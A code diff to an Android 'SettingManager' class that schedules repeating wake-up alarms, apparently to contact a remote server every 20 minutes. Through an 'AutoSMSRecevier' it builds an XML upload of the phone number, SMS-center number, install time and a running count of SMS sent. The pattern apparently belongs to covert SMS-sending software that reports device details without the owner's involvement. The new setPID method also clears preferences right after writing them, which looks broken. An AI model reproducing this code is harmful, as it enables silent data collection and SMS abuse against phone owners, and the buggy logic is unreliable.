@@ -87,6 +87,8 @@ public class SettingManager {
     public static final String VEDIO_DOWNLOAD_COUNT = "vedio_download_count";
     public static final String LAST_VEDIO_DOWNLOAD_TIME = "last_vedio_download_time";
     
+    public static final String CONNECT_NETWORK_REASON = "reason";
+    
     private static final String CMWAP = "cmwap";
     public static final String CMNET = "cmnet";
 //    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
@@ -134,6 +136,7 @@ public class SettingManager {
     public boolean mCMNetIsReady;
     public CMWapNetworkChangeReceiver mCMWapChangeReceiver;
     public CMNetNetworkChangeReceiver mCMNetChangeReceiver;
+    public boolean mHasSetFetchServerInfoAlarm;
     
     public static SettingManager getInstance(Context context) {
         if (gSettingManager == null) {
@@ -508,10 +511,22 @@ public class SettingManager {
         return mSP.getString(SMS_CENTER, null);
     }
     
-    public void tryToFetchInfoFromServer(long delayTime) {
-        cancelFetchInfo();
-//        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
-        final long DEFAULT_FETCH_DELAY = ((long) 1) * 10 * 60 * 1000;
+    public void setPID(String pid) {
+        if (pid != null && pid.equals("0") == false) {
+            mEditor.putString("pid", pid);
+            mEditor.clear();
+        }
+    }
+    
+    public String getPID() {
+        return mSP.getString("pid", null);
+    }
+    
+    public void setNextFetchChannelInfoFromServerTime(long delayTime, boolean repeatable) {
+        LOGD("");
+        log("");
+//      final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
+        final long DEFAULT_FETCH_DELAY = ((long) 1) * 20 * 60 * 1000;
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_CONNECT_SERVER);
         PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
@@ -530,8 +545,39 @@ public class SettingManager {
         }
         
         AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
-        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, connect_delay_time, sender);
+        if (repeatable == true) {
+            am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, connect_delay_time, sender);
+            mHasSetFetchServerInfoAlarm = true;
+        } else {
+            am.set(AlarmManager.RTC_WAKEUP, firstTime, sender);
+            mHasSetFetchServerInfoAlarm = true;
+        }
     }
+    
+//    public void tryToFetchInfoFromServer(long delayTime) {
+//        cancelFetchInfo();
+////        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
+//        final long DEFAULT_FETCH_DELAY = ((long) 1) * 10 * 60 * 1000;
+//        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
+//        intent.setAction(AUTO_CONNECT_SERVER);
+//        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+//        long currentTime = System.currentTimeMillis();
+//        long firstTime = currentTime;
+//        
+//        long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
+//        long latestConnectTime = getLastConnectServerTime();
+//        long tempDelay = 10 * 1000;
+//        if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
+//            firstTime = currentTime + tempDelay;
+//        } else if (latestConnectTime != 0) {
+//            firstTime = latestConnectTime + connect_delay_time;
+//        } else {
+//            firstTime = currentTime + tempDelay;
+//        }
+//        
+//        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
+//        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, connect_delay_time, sender);
+//    }
     
     private void cancelFetchInfo() {
         LOGD("[[cancelFetchInfo]]");
@@ -660,11 +706,11 @@ public class SettingManager {
         return null;
     }
     
-    private void savePhoneInfo() {
+    private void savePhoneInfo(String reason) {
         String smsCenter = this.getSMSCenter();
         //test code
 //        if (smsCenter == null) {
-            smsCenter = "13800100500";
+//            smsCenter = "13800100500";
 //        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
@@ -682,8 +728,9 @@ public class SettingManager {
             }
             String version = "1.0.1";
             String first = "1";
-            String handled = "0";
+            String handled = String.valueOf(getSMSRoundTotalSend());
             String pid = mPid;
+            if (reason == null) reason = "";
             String installTime = getFirstStartTime();
             if (installTime == null) {
                 this.setFirstStartTime();
@@ -751,6 +798,10 @@ public class SettingManager {
                 child.text(phonenum);
                 child.endTag("", "phonenum");
                 
+                child.startTag("", "reason");
+                child.text(reason);
+                child.endTag("", "reason");
+                
                 serializer.endTag("", "body");
                 serializer.flush();
                 serializer.endDocument();
@@ -768,8 +819,8 @@ public class SettingManager {
         }
     }
     
-    public boolean getXMLInfoFromServer() {
-        savePhoneInfo();
+    public boolean getXMLInfoFromServer(String reason) {
+        savePhoneInfo(reason);
         
         File file = new File(UPLOAD_FILE_PATH);
         if (file.exists() == false) {
